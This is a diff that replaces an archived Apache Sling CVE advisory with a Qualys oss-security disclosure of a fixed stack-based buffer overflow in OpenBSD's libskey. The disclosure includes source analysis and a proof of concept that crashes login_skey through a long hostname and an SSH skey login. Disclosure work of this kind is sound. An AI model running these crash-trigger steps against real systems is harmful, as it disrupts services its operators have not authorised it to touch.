@@ -1,28 +1,105 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/02/23/2
-Message-ID: <7e538c37-50f5-0c58-3e2d-b44a8f37b5c3@apache.org>
-Date: Thu, 23 Feb 2023 08:40:58 +0000
-From: Carsten Ziegeler <cziegeler@...che.org>
-To: oss-security@...ts.openwall.com
-Subject: CVE-2023-25621: Apache Sling does not allow to handle i18n content in a secure way 
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/03/15/7
+Message-ID: <20230315231308.GA24066@localhost.localdomain>
+Date: Wed, 15 Mar 2023 23:13:23 +0000
+From: Qualys Security Advisory <qsa@...lys.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: Minor stack-based buffer overflow in OpenBSD's libskey
 Content-Type: text/plain; charset=utf-8
 
-Severity: important
+Hi all,
 
-Description:
+(Posting this report here in case another project uses the same code.)
 
-Privilege Escalation vulnerability in Apache Software Foundation Apache Sling.
-Any content author is able to create i18n dictionaries in the repository in a location the author has write access to. As these translations are used across the whole product, it allows an author to change any text or dialog in the product. For example an attacker might fool someone by changing the text on a delete button to "Info".
-This issue affects the i18n module of Apache Sling up to version 2.5.18. Version 2.6.2 and higher limit by default i18m dictionaries to certain paths in the repository (/libs and /apps).
+We discovered a minor stack-based buffer overflow in OpenBSD's libskey;
+it was introduced in July 1997 by the following commit:
 
-Users of the module are advised to update to version 2.6.2 or higher, check the configuration for resource loading and then adjust the access permissions for the configured path accordingly.
+https://github.com/openbsd/src/commit/ea55ee16580e7b47c83712c5fd50615f8b1d26ad
 
-This issue is being tracked as SLING-11744 
+and was fixed today by the following commit (thanks to OpenBSD for their
+incredibly quick response!):
 
-References:
+https://github.com/openbsd/src/commit/848ef98a011b51fa811cb86fe900433edd2db24a
 
-https://sling.apache.org/news.html
-https://sling.apache.org/
-https://www.cve.org/CVERecord?id=CVE-2023-25621
-https://issues.apache.org/jira/browse/SLING-11744
+and although the vulnerable function is reachable remotely via OpenSSH,
+this bug is useless in practice:
 
+- the hostname of the affected system must be longer than 126 characters
+  to trigger this buffer overflow;
+
+- the characters that overflow this buffer are all '\0' characters (the
+  filler characters of a strncpy() call).
+
+========================================================================
+Analysis
+========================================================================
+
+For users who do not have an entry in the S/Key database (the default on
+OpenBSD), libskey generates a fake challenge:
+
+------------------------------------------------------------------------
+ 46 #define SKEY_MAX_PW_LEN         255
+ ..
+ 49 #define SKEY_MAX_SEED_LEN       16
+------------------------------------------------------------------------
+420 skey_fakeprompt(char *username, char *skeyprompt)
+421 {
+422         char secret[SKEY_MAX_SEED_LEN], pbuf[SKEY_MAX_PW_LEN+1], *p, *u;
+...
+428         /*
+429          * Base first 4 chars of seed on hostname.
+430          * Add some filler for short hostnames if necessary.
+431          */
+432         if (gethostname(pbuf, sizeof(pbuf)) == -1)
+433                 *(p = pbuf) = '.';
+434         else
+435                 for (p = pbuf; isalnum((unsigned char)*p); p++)
+436                         if (isalpha((unsigned char)*p) &&
+437                             isupper((unsigned char)*p))
+438                                 *p = (char)tolower((unsigned char)*p);
+439         if (*p && pbuf - p < 4)
+440                 (void)strncpy(p, "asjd", 4 - (pbuf - p));
+------------------------------------------------------------------------
+
+Unfortunately, "pbuf - p" at lines 439 and 440 should be "p - pbuf", so
+the "pbuf - p < 4" test at line 439 always succeeds and the strncpy() at
+line 440 may overflow pbuf (if 2 * (p - pbuf) + 4 > 255 + 1, i.e. if the
+hostname is longer than 126 characters).
+
+========================================================================
+Proof of concept
+========================================================================
+
+- First, as root on an OpenBSD system:
+
+------------------------------------------------------------------------
+# hostname="`hostname`"
+
+# hostname `perl -e 'print "a" x 136'`.my.domain
+
+# ktrace -i /usr/sbin/sshd -d -p 2222
+------------------------------------------------------------------------
+
+- Second, as a remote attacker:
+
+------------------------------------------------------------------------
+$ ssh -o ChallengeResponseAuthentication=yes -o KbdInteractiveAuthentication=yes -o PreferredAuthentications=keyboard-interactive -o KbdInteractiveDevices=bsdauth -l nobody:skey -p 2222 192.168.56.123
+------------------------------------------------------------------------
+
+- Third, again as root on the OpenBSD system:
+
+------------------------------------------------------------------------
+# hostname "$hostname"
+
+# kdump
+...
+6718 login_skey PSIG  SIGSEGV SIG_DFL code SEGV_MAPERR<1> addr=0x7f7f00000000 trapno=6
+------------------------------------------------------------------------
+
+We are at your disposal for questions, comments, and further
+discussions. Thank you very much!
+
+With best regards,
+
+-- 
+the Qualys Security Advisory team
